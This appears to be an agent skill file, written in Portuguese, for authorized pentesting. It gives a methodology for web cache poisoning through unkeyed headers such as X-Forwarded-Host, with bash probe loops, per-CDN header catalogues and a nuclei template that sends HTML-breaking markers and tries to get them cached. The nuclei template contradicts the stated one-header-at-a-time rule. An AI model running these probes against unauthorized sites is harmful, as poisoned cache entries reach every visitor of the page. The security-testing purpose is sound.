---
name: cache-poisoning-headers
description: Metodologia de Web Cache Poisoning via HEADERS não-chaveados (não cookies) para bug bounty e pentest autorizado. Use SEMPRE que o alvo tiver CDN/proxy reverso e páginas HTML cacheáveis, e sempre que o usuário mencionar "cache poisoning por header", "X-Forwarded-Host", "X-Forwarded-Prefix", "X-Original-URL", "X-Rewrite-URL", "unkeyed header", "header refletido no HTML", "poisoning de CDN". A chave de cache é método+host+path+query+headers do Vary, então quase todo header customizado é NÃO-CHAVEADO: ele muda a resposta sem mudar a chave, e a resposta envenenada fica salva para TODOS os visitantes. FLUXO EM 3 FASES, SEMPRE UM HEADER POR VEZ — nunca vários headers na mesma requisição, porque marcadores simultâneos corrompem o HTML, uma reflexão esconde a outra e se perde a atribuição. Fase 1: enviar o marcador INERTE '"><xandsz> em um header por vez, com cache buster próprio, e ver se reflete no corpo HTML — se nenhum refletir, encerrar a página sem gastar mais requisição. Fase 2: só nos headers que refletiram, tentar cachear com o CICLO DE 3 REQUISIÇÕES — (1) SEED com o marcador naquele header, (2) COMMIT idêntica porque muitos caches só armazenam a partir da segunda passagem, (3) VALIDATION limpa, sem header injetado e com User-Agent diferente, simulando a vítima; marcador de volta na REQ 3 = poisoning confirmado. Fase 3: se refletiu mas não cacheou, retry anexando extensão ao path — apenas .js, .jpg e .css. REGRA DO CACHE BUSTER: mesmo cb nas 3 requisições do ciclo, cb NOVO ao trocar de header, de extensão, de página ou ao repetir rodada. Marcador inerte sempre — nunca payload executável. Cobre: FINGERPRINT DA TECNOLOGIA ANTES de escolher headers (Cloudflare, Akamai, Fastly, Varnish, CloudFront, nginx, Apache, IIS/ASP.NET, Spring Boot, PHP/Laravel, Envoy) com catálogo específico de cada uma — CF-Connecting-IP/CF-Visitor na Cloudflare, True-Client-IP/X-Akamai-* na Akamai, Fastly-Client-IP/Surrogate-Control na Fastly, CloudFront-Forwarded-Proto na AWS, X-Real-IP/X-Accel-Redirect no nginx, X-Original-URL/X-Rewrite-URL no IIS, X-Forwarded-Prefix no Spring Boot (campeão nesse stack, usado para montar todos os links internos) — mais catálogo por categoria (host/roteamento, prefixo/path, esquema, IP do cliente, padrão), variantes de escrita com underscore e ponto (X_Forwarded_Host, X.Forwarded.Host) como parameter cloaking testadas só no header que já refletiu, aviso de que Vary nem sempre é honrado pelas CDNs e não serve para descartar o alvo, por que X-Forwarded-Host costuma refletir em URLs absolutas (canonical, og:url, script src) gerando também hijack de recurso, por que o Host puro não funciona (é chaveado), retry com extensão .js/.css/.jpg quando não cacheia, aviso de que ausência de header de cache NÃO invalida o achado (a prova é comportamental), template nuclei pronto, salvar PoC e alertar. CONTROLE DE LOOP: registrar o testado por TEMPLATE (não por URL) — não repetir header no mesmo template, não retestar outra URL do mesmo template, e em template novo só retestar header que já provou refletir em algum lugar, descartando de vez o header sem reflexão em 3 templates. Cache buster OBRIGATÓRIO em todo teste. Só usar dentro do escopo formalmente autorizado.
---

# Web Cache Poisoning via Headers Não-Chaveados

Metodologia para envenenar cache através de **headers** — a variante irmã da
skill `cache-poisoning-xss`, que trata a mesma classe pelo lado dos cookies.

**Pré-condição obrigatória**: só use dentro do escopo formalmente autorizado.

**REGRA DE OURO — cache buster sempre.** Envenenar uma URL real afeta usuários
reais. Todo teste roda numa chave isolada (`?cb=<aleatório>`). Ver seção 4.

## 1. A ideia central — header não-chaveado

A chave de cache é:

```
   chave = método + host + path + query + (headers listados em Vary)
```

**Praticamente nenhum header customizado entra nessa chave.** Isso cria a
condição perfeita:

```
   atacante envia  X-Forwarded-Host: "><xand>   ->  resposta envenenada
                   (mesma URL, mesma chave)              |
                                                         v
                                              cache SALVA essa resposta
                                                         |
   vítima abre a URL normal, sem header nenhum  ->  recebe o marcador
```

O header some da equação da chave, mas continua influenciando o corpo da
resposta. É isso que torna o ataque possível.

**Por que o `Host` puro não funciona:** o `Host` **é** parte da chave. Alterá-lo
gera uma entrada de cache diferente e o envenenamento não atinge ninguém. Por
isso os alvos são os *substitutos* de Host — `X-Forwarded-Host`, `X-Host`,
`X-Forwarded-Server` — que a aplicação lê mas o cache ignora.

## 2. Escopo

**Só páginas que respondem `Content-Type: text/html`.**

```bash
curl -sI "$URL" | grep -i '^content-type:' | grep -qi 'text/html' || echo "FORA DE ESCOPO"
```

Se a resposta for JSON, CSS, JS ou imagem, pule — não entra na rodada.

## 3. Fluxo — três fases, SEMPRE um header por vez

**Nunca injete vários headers na mesma requisição.** Marcadores simultâneos
corrompem o HTML, uma reflexão esconde a outra e você perde a atribuição — sem
saber qual header é o vetor não há report reproduzível. Um por vez, do começo
ao fim.

### Fase 1 — Quais headers refletem no HTML

Manda o marcador `'"><xandsz>` em **um** header, com cache buster próprio, e
verifica se ele volta no corpo HTML. Uma requisição por header — sem ciclo de
cache ainda, isto é só descoberta de reflexão.

```bash
M="'\"><xandsz>"
HEADERS=(
  "X-Forwarded-Host" "X-Forwarded-Prefix" "X-Forwarded-Server"
  "X-Forwarded-Scheme" "X-Original-URL" "X-Rewrite-URL"
  "X-Host" "X-Real-IP" "X-Forwarded-For" "Referer" "User-Agent"
)

: > refletiram.txt
for H in "${HEADERS[@]}"; do
  CB="?cb=$RANDOM$RANDOM"                       # buster NOVO por header
  U="https://alvo.com/pagina$CB"
  curl -s "$U" -o /tmp/r.html -D /tmp/h.txt -H "$H: $M"

  grep -qi 'text/html' /tmp/h.txt || { echo "[skip]     $H (nao e html)"; continue; }

  if grep -qaF "$M" /tmp/r.html; then
    echo "[EXATO]    $H"
    grep -naF "$M" /tmp/r.html | head -3        # contexto
    echo "$H" >> refletiram.txt
  elif grep -qa 'xandsz' /tmp/r.html; then
    echo "[PARCIAL]  $H"
    grep -na 'xandsz' /tmp/r.html | head -3
    echo "$H" >> refletiram.txt
  else
    echo "[ nada ]   $H"
  fi
  sleep 1
done
```

**Se `refletiram.txt` sair vazio, pare esta página.** Sem reflexão não existe
vetor, e não faz sentido gastar requisições tentando cachear.

Anote **o contexto** de cada acerto — a linha do HTML onde caiu (atributo,
`<script src>`, `<base>`, `<link>`, texto).

### Fase 2 — Só nos que refletiram: tentar cachear

Agora, **só para os headers de `refletiram.txt`**, rode o ciclo de cache. Um
header por vez, **cache buster novo** para cada.

```
   ┌── REQ 1 · SEED ──────────────────────────────────────┐
   │  GET /?cb=123    + o marcador NAQUELE header          │
   │  faz a origem gerar a resposta envenenada             │
   └───────────────────────────┬───────────────────────────┘
                               ▼
   ┌── REQ 2 · COMMIT ────────────────────────────────────┐
   │  IDÊNTICA à req 1, mesmo cb                           │
   │  garante que o cache ARMAZENE                         │
   └───────────────────────────┬───────────────────────────┘
                               ▼
   ┌── REQ 3 · VALIDATION ────────────────────────────────┐
   │  GET /?cb=123    SEM header injetado, UA diferente    │
   │  marcador apareceu?  ->  POISONING CONFIRMADO         │
   └───────────────────────────────────────────────────────┘
```

```bash
M="'\"><xandsz>"
while read H; do
  CB="?cb=$RANDOM$RANDOM"               # buster NOVO por header
  U="https://alvo.com/pagina$CB"

  curl -s "$U" -o /dev/null -H "$H: $M"          # 1 seed
  sleep 1
  curl -s "$U" -o /dev/null -H "$H: $M"          # 2 commit
  sleep 1
  curl -s "$U" -o /tmp/v.html -D /tmp/vh.txt \
    -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"   # 3 limpa

  if grep -qaF "$M" /tmp/v.html; then
    echo ">>> POISONING CONFIRMADO: $H"
    cp /tmp/v.html "poc_${H}.html"; cp /tmp/vh.txt "poc_${H}_headers.txt"
  else
    echo "[reflete mas nao cacheou] $H  -> vai para a fase 3"
  fi
  sleep 1
done < refletiram.txt
```

**As três requisições do ciclo usam o MESMO `cb`** — se mudar no meio, você
testa chaves diferentes e o resultado não vale. O buster só muda **ao trocar de
header** ou de técnica.

**Por que duas requisições de envenenamento:** vários caches não guardam na
primeira passagem — alguns só promovem a entrada depois de N acessos, outros
tratam a primeira como `MISS` que apenas atravessa até a origem. A REQ 2 elimina
esse falso negativo.

**Por que a REQ 3 precisa ser limpa de verdade:** troque também o `User-Agent`.
Se repetir o mesmo UA e o alvo variar por UA, você não sabe se recebeu do cache
ou se a origem regerou. A validação simula a vítima — e a vítima não manda nada
disso.

### Fase 3 — Não cacheou? Retry com extensão

Refletiu (fase 1) mas o marcador não voltou na REQ 3 (fase 2)? Não descarte.
Anexe extensão estática ao path e repita o ciclo de 3 requisições.

**Apenas três extensões: `.js`, `.jpg`, `.css`.** Nada além, para economizar
requisição. **Buster novo a cada extensão.**

```bash
M="'\"><xandsz>"
H="X-Forwarded-Host"                     # o header que refletiu
for EXT in .js .jpg .css; do
  CB="?cb=$RANDOM$RANDOM"                # buster NOVO por extensao
  U="https://alvo.com/pagina${EXT}${CB}"
  curl -s "$U" -o /dev/null -H "$H: $M"          # seed
  curl -s "$U" -o /dev/null -H "$H: $M"          # commit
  curl -s "$U" -o /tmp/e.html -D /tmp/eh.txt \
    -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
  if grep -qaF "$M" /tmp/e.html; then
    echo ">>> CACHEOU com $EXT"
    cp /tmp/e.html "poc_${H}${EXT}.html"
  fi
  sleep 1
done
```

Só descarte depois que as três extensões falharem — aí é reflexão de header sem
cache, achado fraco por si só.

### 3.1 Critérios de confirmação

Os três precisam bater na REQ 3:

| Critério | Verificação |
|---|---|
| Marcador presente | corpo da REQ 3 contém `'"><xandsz>` |
| É HTML | header da REQ 3 contém `text/html` |
| Resposta servida | status da REQ 3 é `200` |

Headers de cache (`Age`, `X-Cache`, `CF-Cache-Status: HIT`) reforçam, mas
**não são obrigatórios** — ver seção 8.

## 4. Regra do cache buster

O buster isola a sua chave de cache, para não envenenar a página real.

```
mesmo cb    ->  dentro do ciclo de 3 requisições (seed, commit, validation)
cb NOVO     ->  ao trocar de header
cb NOVO     ->  ao trocar de extensão
cb NOVO     ->  ao trocar de página
cb NOVO     ->  ao repetir uma rodada já feita
```

Reutilizar buster significa chave já suja de uma rodada anterior — o resultado
deixa de ser confiável. Nunca deixe nada cacheado numa URL real de produção; se
envenenou sem querer, avise o programa imediatamente.

## 5. Catálogo de headers por categoria

### 5.0 Primeiro: fingerprint da tecnologia

**Antes de escolher headers, descubra o que está na frente.** Testar 11 headers
genéricos em todo alvo é desperdício; cada CDN e cada framework tem os seus, e
esses são os que realmente rendem.

```bash
curl -sI "https://alvo.com/" | grep -iE \
 'server|via|x-cache|cf-|akamai|fastly|x-varnish|x-served-by|cloudfront|x-amz|x-powered-by|x-aspnet|surrogate'
```

| Pista no header/resposta | Tecnologia | Vá para |
|---|---|---|
| `CF-Ray`, `CF-Cache-Status`, `Server: cloudflare` | Cloudflare | 5.6 |
| `X-Akamai-*`, `Akamai-*`, `Server: AkamaiGHost` | Akamai | 5.6 |
| `X-Served-By`, `Fastly-*`, `Surrogate-Key` | Fastly | 5.6 |
| `X-Varnish`, `Via: ... varnish` | Varnish | 5.6 |
| `X-Amz-Cf-Id`, `Via: ... CloudFront` | CloudFront | 5.6 |
| `Server: nginx` | nginx | 5.6 |
| `X-Powered-By: ASP.NET`, `Server: Microsoft-IIS` | IIS / ASP.NET | 5.6 |
| `X-Application-Context`, erro do Whitelabel | Spring Boot | 5.6 |
| `X-Powered-By: PHP`, `Set-Cookie: laravel_session` | PHP/Laravel | 5.6 |
| `X-Envoy-*`, `Server: envoy` | Envoy / Istio | 5.6 |

Combine os dois lados: o **CDN** dá um conjunto de headers, o **framework de
origem** dá outro. Teste a união dos dois conjuntos identificados, mais os
genéricos da 5.1.

### 5.1 Substitutos de Host — os que mais rendem

```
X-Forwarded-Host        X-Host              X-Forwarded-Server
X-HTTP-Host-Override    Forwarded           X-Original-Host
```

Costumam ser lidos pela aplicação para montar **URLs absolutas**. A reflexão
aparece em:

```html
<link rel="canonical" href="https://VALOR/pagina">
<meta property="og:url" content="https://VALOR/pagina">
<script src="https://VALOR/static/app.js">
<base href="https://VALOR/">
```

**Isso é mais do que XSS.** Se o valor entra num `<script src>` ou `<base>`, o
atacante não precisa nem quebrar o HTML — basta apontar para um host próprio e
todo visitante da página cacheada carrega script dele. Registre esse cenário
separadamente no report; a severidade é maior.

### 5.2 Prefixo e reescrita de path

```
X-Forwarded-Prefix      X-Original-URL      X-Rewrite-URL
X-Original-Path         X-Override-URL
```

`X-Forwarded-Prefix` é especialmente comum em **Spring Boot** atrás de gateway:
a aplicação o usa para montar os links internos, então o valor aparece em todos
os `href`/`src` relativos da página.

### 5.3 Esquema

```
X-Forwarded-Proto       X-Forwarded-Scheme      X-Forwarded-SSL
Front-End-Https         X-Url-Scheme
```

### 5.4 IP do cliente

```
X-Real-IP           X-Forwarded-For       True-Client-IP
CF-Connecting-IP    X-Client-IP           X-Cluster-Client-IP
```

Refletem quando a página exibe "seu IP", geolocalização ou log de acesso.

### 5.5 Headers padrão

```
User-Agent      Referer      Origin      Accept-Language
X-HTTP-Method-Override
```

Menos frequentes, mas o `Referer` refletido em link de "voltar" e o
`Accept-Language` em seletor de idioma acontecem.

### 5.6 Catálogo por tecnologia

Use o subconjunto da tecnologia que você identificou na 5.0.

**Cloudflare**
```
CF-Connecting-IP        CF-IPCountry        CF-Visitor
CF-Worker               CF-Ray
```
`CF-Visitor` carrega JSON com o esquema (`{"scheme":"https"}`) e às vezes é
usado pela aplicação para montar URLs — bom candidato.

**Akamai**
```
True-Client-IP                      X-Akamai-Config-Log-Detail
X-Akamai-Device-Characteristics     Akamai-Origin-Hop
X-Forwarded-Host                    X-Akamai-Edgescape
```
`True-Client-IP` é o header de IP do cliente na Akamai — equivalente ao
`X-Real-IP` de outros.

**Fastly**
```
Fastly-Client-IP      Fastly-SSL      Fastly-FF
Surrogate-Key         Surrogate-Control
```
`Surrogate-Control` influencia diretamente o comportamento de cache — se for
não-chaveado e a origem o repassar, dá para manipular TTL.

**Varnish**
```
X-Varnish        X-Forwarded-For        X-Cache-Hits
```

**CloudFront (AWS)**
```
CloudFront-Forwarded-Proto        CloudFront-Viewer-Country
CloudFront-Is-Mobile-Viewer       CloudFront-Is-Desktop-Viewer
X-Amz-Cf-Id
```

**nginx**
```
X-Real-IP           X-Forwarded-Proto       X-Accel-Redirect
X-Accel-Expires     X-Forwarded-Ssl
```
`X-Accel-Redirect` e `X-Accel-Expires` são de resposta, mas se a aplicação os
ecoar a partir de input, viram vetor.

**Apache**
```
X-Forwarded-Server        X-Sendfile
```

**Spring Boot / Spring Cloud Gateway**
```
X-Forwarded-Prefix        X-Forwarded-Port        Forwarded
```
**`X-Forwarded-Prefix` é o campeão nesse stack** — o Spring o usa para montar
todos os links internos, então o valor aparece em `href`/`src` de toda a
página.

**IIS / ASP.NET**
```
X-Original-URL        X-Rewrite-URL        X-Original-Host
```
No IIS esses dois primeiros reescrevem o path **depois** da decisão de cache —
combinam com a skill `bypass-403-sensitive-files`.

**PHP / Laravel / Symfony**
```
X-HTTP-Method-Override        X-Original-Host        X-Forwarded-Ssl
```

**Envoy / Istio / Traefik**
```
X-Envoy-Original-Path        X-Envoy-External-Address
X-Forwarded-Client-Cert      X-Envoy-Internal
```

### 5.7 Variantes de escrita — parameter cloaking

Alguns caches normalizam ou ignoram headers com `_` e `.`, enquanto a origem os
converte de volta para `-`. Quando o header na forma normal **não** passa, vale
testar as variantes:

```
X-Forwarded-Host        (forma normal)
X_Forwarded_Host        (underscore)
X.Forwarded.Host        (ponto)
```

Teste as variantes **só no header que já provou refletir** — não multiplique a
matriz inteira por três. É uma tentativa extra quando o vetor existe mas o cache
está chaveando o header original.

**Nota sobre o `Vary`:** ele deveria proteger, listando os headers que compõem a
chave. Na prática **nem sempre é honrado pelas CDNs** — um alvo pode devolver
`Vary: X-Forwarded-Host` e ainda assim servir a resposta envenenada a quem não
mandou o header. Não descarte um alvo pelo `Vary`; confirme pelo teste
comportamental (seção 8).

## 6. O marcador

```
'"><xandsz>
```

Tem aspa simples, aspa dupla, `>`, `<` — fecha atributo, fecha tag e abre uma
tag inexistente `<xandsz>`.
Contém os metacaracteres que importam, é único e fácil de localizar — e é
**inerte**: não executa nada.

**A skill nunca envia payload executável.** O marcador cacheado, chegando a uma
requisição limpa, já é a prova completa do poisoning. O XSS que seria possível é
apenas **descrito** no report.

Leitura da reflexão:

| O que voltou na REQ 3 | Conclusão |
|---|---|
| `'"><xandsz>` exatamente | Confirmado. |
| `&#39;&quot;&gt;&lt;xandsz&gt;` | HTML-encoded — sem vetor. |
| `"><xandsz>` (sumiu a aspa simples) | Parcial — registre o que foi filtrado. |
| `xandsz` sem metacaracteres | Reflete mas filtra tudo. |
| nada | Sem vetor nesta URL. |

## 7. Progressão automática

Se a condição bate, avance sozinho:

```
header reflete no HTML      ->  tenta cachear com o ciclo de 3 req (fase 2)
marcador volta na REQ 3     ->  registra contexto, salva PoC, ALERTA
reflete mas não cacheia     ->  retry com .js / .jpg / .css (fase 3)
nenhum header reflete       ->  encerra a página, não gasta mais request
```

Só interrompem a marcha: falta de cache buster, alvo fora de escopo, ou
qualquer situação que exigiria payload executável — a skill não envia.

## 8. Ausência de header de cache NÃO invalida o achado

Muitos alvos armazenam sem anunciar. Proxies reversos internos, CDNs
configuradas para remover headers de debug e camadas de cache caseiras guardam
a resposta sem emitir `CF-Cache-Status`, `X-Cache`, `Age`, `Cache-Control` ou
`Vary`.

- **Nunca descarte um alvo só porque não há header de cache.**
- Os headers são **atalho de diagnóstico**, não a prova.
- **A prova é comportamental**: se o marcador voltou na REQ 3 — que não mandou
  header injetado nenhum — ele veio do cache. Ponto.
- Sem `HIT` para se apoiar, reforce: repita o ciclo e valide de **outra rede**
  (POPs de CDN são distribuídos), e registre no report que o cache não emite
  headers.

## 9. Controle de estado — evitar o loop eterno

Sem isso a varredura vira loop infinito: 11 headers × cada página do site ×
3 extensões é volume que não termina nunca e nem rende.

**Chaveie por TEMPLATE, não por URL.** `/produto/123` e `/produto/456` são a
mesma página com dados diferentes — testar as duas é desperdício puro.

```
/produto/123        ->  /produto/*
/blog/post-abc      ->  /blog/*
/user/99/perfil     ->  /user/*/perfil
```

```
tested.csv:  template | header | resultado
/produto/*   X-Forwarded-Host   CONFIRMADO
/produto/*   X-Real-IP          nada
/blog/*      Referer            EXATO
```

| Situação | Ação |
|---|---|
| Mesmo template + mesmo header | **Nunca repetir** |
| Outra URL do mesmo template | **Não retestar** — é a mesma página |
| Template novo, header que **já refletiu** em algum lugar | **Retestar** |
| Template novo, header que nunca refletiu | Testar só na 1ª e 2ª vez |
| Header sem reflexão em **3 templates diferentes** | **Descartar** definitivamente |

**A tensão real:** algumas páginas refletem e outras não — o mesmo
`X-Forwarded-Host` pode aparecer no `canonical` da home e em lugar nenhum na
página de produto. Isso é argumento para testar template novo, **não** para
testar toda URL.

A regra que equilibra: **em template novo, só vale a pena retestar o header que
já provou refletir em algum lugar do site.** Esse é o candidato que se carrega
adiante. Os que nunca refletiram vão sendo podados, e a lista encolhe a cada
página — em poucos templates você está testando 1 ou 2 headers, não 11.

Antes de rodar a fase 1 numa página nova, filtre:

```bash
TEMPLATE="/produto/*"
for H in "${HEADERS[@]}"; do
  grep -q "^${TEMPLATE},${H}," tested.csv && continue      # ja testado aqui
  grep -q ",${H},DESCARTADO$" tested.csv && continue       # podado
  echo "$H"
done > headers_a_testar.txt
```

Se `headers_a_testar.txt` sair vazio, **pule a página inteira**.

**Quantos templates testar:** pare quando dois templates seguidos não
revelarem nenhum header novo refletindo. A partir daí o retorno é zero.

## 10. Saída obrigatória — salvar PoC e alertar

```bash
OUT="poc_cache_poisoning_headers_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"
cp /tmp/r1.html "$OUT/1_seed.html"
cp /tmp/r2.html "$OUT/2_commit.html"
cp /tmp/r3.html "$OUT/3_validation_limpa.html"
cp /tmp/h3.txt  "$OUT/3_headers.txt"
cat > "$OUT/poc.txt" <<EOF
URL:       $URL
HEADER:    <header isolado responsável>
MARCADOR:  "><xand>
CONTEXTO:  <linha do HTML onde refletiu>
CACHE:     <Age / X-Cache, ou "sem header de cache">
EOF
```

Alerte com o nível do sinal:

- `REFLEXÃO NA REQ 1` — o header reflete, mas ainda não provou cache. Siga.
- `REFLEXÃO PARCIAL` — diga qual caractere foi filtrado.
- `POISONING CONFIRMADO` — o marcador voltou na REQ 3 limpa. Alerta forte:
  URL, header responsável, contexto, e onde a PoC foi salva.

Nunca alerte "confirmado" sem a REQ 3 limpa ter retornado o marcador.

## 11. Template nuclei

Template que expressa o padrão de 3 requisições:

```yaml
id: cache-poisoning-xforwarded11

info:
  name: Cache Poisoning Detection - X-Forwarded Headers Injection - xandsz
  author: xandsz
  severity: high
  description: |
    Detecta envenenamento de cache explorando a reflexão de múltiplos headers X-Forwarded e outros.
    Valida se o payload '"><xand>' persiste na resposta da terceira requisição (limpa).
  tags: cache, poisoning, x-forwarded, xss, fuzzer

http:
  # Requisição 1 - Seed (Injeção em massa)
  - raw:
      - |
        GET ?cb=3332 HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Prefix: "><xand>
        X-Original-URL: /?cb=3332"><xand>
        X-Rewrite-URL: /?cb=3332"><xand>
        X-Forwarded-Server: "><xand>
        X-Real-IP: 127.0.0.1"><xand>
        X-Forwarded-Host: "><xand>
        Referer: https://{{Hostname}}/"><xand>
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "><xand>
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip, deflate, br

  # Requisição 2 - Commit (Reforço do envenenamento)
  - raw:
      - |
        GET ?cb=3332 HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Prefix: "><xand>
        X-Original-URL: /?cb=3332"><xand>
        X-Rewrite-URL: /?cb=3332"><xand>
        X-Forwarded-Server: "><xand>
        X-Real-IP: 127.0.0.1"><xand>
        X-Forwarded-Host: "><xand>
        Referer: https://{{Hostname}}/"><xand>
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "><xand>
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip, deflate, br

  # Requisição 3 - Validation (Vítima - Requisição limpa)
  - raw:
      - |
        GET ?cb=3332 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip, deflate, br

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          # Verifica se o payload aparece na resposta da REQUISIÇÃO 3
          - "contains(all_3, '><xand>')"
          # Garante que a resposta é um HTML
          - "contains(header_3, 'text/html')"
          # Confirma que o cache serviu a página (opcional, mas ajuda a evitar falsos positivos)
          - "status_3 == 200"
        condition: and
```

**Ao adaptar o template:** troque o `cb=3332` fixo por um valor aleatório por
execução — buster reutilizado significa chave de cache já suja de uma rodada
anterior, e resultado não confiável.

## 12. Reportar

1. Mostre as **três requisições** na ordem, com os headers completos.
2. Destaque que a REQ 3 **não envia header nenhum** e ainda assim recebe o
   marcador — é a prova de que veio do cache.
3. Nomeie o **header responsável** (o isolado na fase 2), não a lista inteira.
4. Mostre o contexto exato da reflexão no HTML.
5. Se o valor cai em `<script src>`, `<base>` ou `<link>`, descreva o cenário de
   **hijack de recurso** separadamente — é impacto maior que XSS refletido.
6. Diga que usou marcador benigno e cache buster: mostra teste responsável e
   que nenhum payload ativo ficou cacheado.
7. Remediação: incluir o header na chave de cache (ou no `Vary`), não confiar em
   header de proxy para montar URL, e escapar a saída no contexto correto.

## 13. Checklist

- [ ] Escopo: só páginas com `Content-Type: text/html`.
- [ ] Cache buster único em **todos** os requests; o mesmo buster nas 3 do ciclo.
- [ ] Ciclo de 3 requisições respeitado: SEED, COMMIT, VALIDATION.
- [ ] REQ 3 realmente limpa — sem header injetado e com `User-Agent` diferente.
- [ ] Marcador `'"><xandsz>` — nenhum payload executável, em nenhuma fase.
- [ ] Fingerprint da tecnologia feito ANTES de escolher headers (5.0).
- [ ] Testado o subconjunto do CDN + do framework identificados, não os 11 genéricos sempre.
- [ ] Um header por requisição, do começo ao fim — nunca vários juntos.
- [ ] Contexto da reflexão registrado (atributo, `<script src>`, `<base>`, texto).
- [ ] Reflexão em URL absoluta avaliada também como hijack de recurso.
- [ ] Não cacheou? Retry com **apenas** `.js` / `.jpg` / `.css`, buster novo em cada.
- [ ] Sem header de cache não foi tratado como ausência de bug.
- [ ] Variantes `_` / `.` testadas apenas no header que já refletiu (5.7).
- [ ] `Vary` presente não foi usado como motivo para descartar o alvo.
- [ ] Confirmado de outra rede, quando possível.
- [ ] `tested.csv` mantido por TEMPLATE + header; outra URL do mesmo template não retestada.
- [ ] Header sem reflexão em 3 templates descartado; parada após 2 templates sem novidade.
- [ ] PoC salva e usuário alertado com o nível do sinal.
- [ ] Nada além do marcador inerte deixado em cache ao final.
- [ ] Variante por cookie também testada no mesmo alvo (`cache-poisoning-xss`).
